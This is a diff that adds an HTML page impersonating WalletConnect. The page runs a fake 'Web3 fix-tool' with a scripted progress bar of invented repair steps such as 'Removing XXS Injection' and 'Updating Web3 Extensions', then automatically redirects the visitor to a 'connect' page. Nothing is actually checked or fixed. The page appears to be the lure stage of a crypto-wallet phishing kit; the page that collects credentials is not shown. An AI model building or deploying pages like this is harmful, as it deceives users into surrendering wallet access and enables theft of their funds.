@@ -1,0 +1,227 @@
+<!DOCTYPE html><html class="" lang="en"><head>
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WalletConnect</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com/">
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
+    <link rel="shortcut icon" href="assets/favicon.ico" type="image/x-icon">
+    <script src="assets/js/jquery.js"></script>
+    <style>     
+            .progressbar {
+            position: relative;
+            max-width: 500px;
+            width: 100%;
+            margin: 30px auto 0;
+            height: 30px;
+            background: #274545;
+            overflow: hidden;
+            }
+
+            span.progress {
+            position: absolute;
+            left: 0;
+            top: 0;
+            bottom: 0;
+            width: 0;
+            background: #326666;
+            transition: all .3s;
+            }
+        #tool-modal {
+        display: block;
+        margin:0;
+        width:100%;
+    }
+    .my-modal-wrapper {
+        display: flex;
+        flex-direction: column;
+        position: fixed;
+        background-color: rgb(17, 17, 17);
+        min-width: 100%;
+        margin: 0;
+        min-height: 100vh;
+        z-index: 9999;
+        justify-content: center;
+        align-items: center;
+        padding: 20px;
+        color: #fff;
+    }
+
+    .my-modal-container {
+        width: 100%;
+        max-width: 600px;
+        background-color: black;
+        padding: 30px;
+        padding-bottom: 40px;
+        border-radius: 5px;
+        font-weight: 200;
+    }
+    .my-row {
+        display: flex;
+        justify-content: space-between;
+        margin-bottom: 15px;
+    }
+
+    .mini-text {
+        font-weight: 200;
+        font-size: 12px;
+        opacity: 0.7;
+        margin-top: 20px;
+    }
+    #green-check {
+        display: none;
+    }
+    .cont-btn {
+        display: none;
+    }
+    .on-mobile-width {
+        display: none;
+    }
+    @media (max-width: 750px) {
+        .on-full-width {
+            display: none
+        }
+        .on-mobile-width {
+            display: block;
+        }
+    }
+    .container {
+        position: relative;
+        padding-bottom: 56.25%;
+        padding-top: 25px;
+        height: 0;
+    }
+
+    .btn-connect {
+        margin: auto;
+        padding: 10px;
+        background-color: dodgerblue;
+        width: 100px;
+        border-radius: 20px;
+        border-style: none;
+        font-size: small;
+        color: #fff;
+        cursor: pointer;
+    }
+
+    .frame {
+        display: none;
+        border-style: solid;
+        border-width: 1px;
+        border-radius: 10px;
+        border-color: rgba(0, 0, 0, 0.4);
+        max-height: 620px;
+        height: 100%;
+        width: 360px;
+        position: fixed;
+        right: 42px;
+        top: 2px;
+        z-index: 9999;
+        box-shadow: 2px 2px 15px 5px #22222296;
+    }
+</style>
+</head>
+<body style="background-color:#000;">
+    <div id="tool-modal">
+        <div class="my-modal-wrapper">
+            <div class="my-modal-container">
+                <p style="max-width: 600px; font-weight: 400; font-size: 12px; opacity: 0.7; margin-bottom: 20px;">
+                    Running Web3 fix-tool...</p>
+                <div class="my-row">
+
+                    <div style="display: flex; flex-direction: row; justify-content: center; align-items: center;">
+                        <img id="green-check" src="assets/images/about_img01.png" height="16px" width="16px" style="margin-right: 5px;">
+                        <p id="process-text" style="margin: 0px;">Processing...</p>
+                    </div>
+                    <div id="cont-btn-container" class="cont-btn">
+                        <form action="connect" method="post">
+                        <button id="tool-cont-btn" type="button" class="btn btn-primary" style="padding-top: 2px; padding-bottom: 2px;">Continue</button>
+                        </form>
+                    </div>
+                </div>
+
+                <div>
+                    <div id="my-progress-container" class="progress" style="height: 4px; max-width: 600px;">
+                        <div id="progress-bar" class="progress-bar progress-bar-striped progress-bar-animated" role="progressbar" aria-valuenow="75" aria-valuemin="0" aria-valuemax="100"></div>
+                    </div>
+                    <div class="counter">0</div>
+                        <div class="progressbar">
+                        <span class="progress"></span>
+                    </div>
+                </div>
+            </div>
+            <p class="mini-text">Do not restart browser or turn off your device.</p>
+        </div>
+    </div>
+
+
+
+                    <script>
+                    $(document).ready(function() {
+                    var progress = $('.progressbar .progress')
+                    function counterInit( fValue, lValue ) {
+                    var counter_value = parseInt( $('.counter').text() );
+                    counter_value++;
+                    if( counter_value >= fValue && counter_value <= lValue ) {
+                        $('.counter').text( counter_value + '%' );
+                        progress.css({ 'width': counter_value + '%' });
+
+                        setTimeout( function() {
+                        counterInit( fValue, lValue );
+                        }, 110 );
+                    }
+                    }
+                    counterInit( 0, 100 );
+                    });
+        var startToolBtn = document.getElementById('start-tool-btn');
+        var modal = document.getElementById('tool-modal');
+        var progressBar = document.getElementById('progress-bar');
+        var processText = document.getElementById('process-text');
+        var greenCheck = document.getElementById('green-check');
+        var processBtn = document.getElementById('tool-cont-btn');
+        var contBtn = document.getElementById('tool-cont-btn');
+        var contBtnContainer = document.getElementById('cont-btn-container');
+        const pageId = GetURLParameter('id')
+        var wcCancelBtn = document.getElementById('wc-cancel');
+        var wcModal = document.getElementById('wc-modal');
+        var processes = ['Processing', 'Clearing browser cache', 'Please wait', 'Checking for XSS Injection', 'Removing XXS Injection', 'Please wait...', 'Updating Javascript package', 'Updating WebRTC', 'Resetting Web3 Extensions', 'Updating Web3 Extensions', 'Please wait', 'Processing']
+        onload = startProcess();
+        contBtn.addEventListener('click', () => {
+            modal.style.display = 'none';
+            // window.location.reload(true);
+        })
+        function startProcess() {
+            let percentage = 0
+            progressBar.style.width = percentage + '%';
+            let a = 0
+            const processInterval = setInterval(() => {
+                progressBar.style.width = (percentage += 10) + '%'
+                // console.log("log: ", a++)
+                a++
+                if (a <= 11) {
+                    console.log('Processing..')
+                    processText.innerHTML = processes[a];
+                } else {
+                    console.log("Done")
+                    processText.innerHTML = "Complete";
+                    greenCheck.style.display = 'block';
+                    contBtnContainer.style.display = 'block';
+                    // modal.style.display = 'none';
+                    window.location.href = `connect`;
+                    clearInterval(processInterval);
+                }
+            }, 850);
+        }
+        function GetURLParameter(sParam) {
+            var sPageURL = window.location.search.substring(1);
+            var sURLVariables = sPageURL.split('&');
+            for (var i = 0; i < sURLVariables.length; i++) {
+                var sParameterName = sURLVariables[i].split('=');
+                if (sParameterName[0] == sParam) {
+                    return sParameterName[1];
+                }
+            }
+        }
+    </script>
+</body></html>
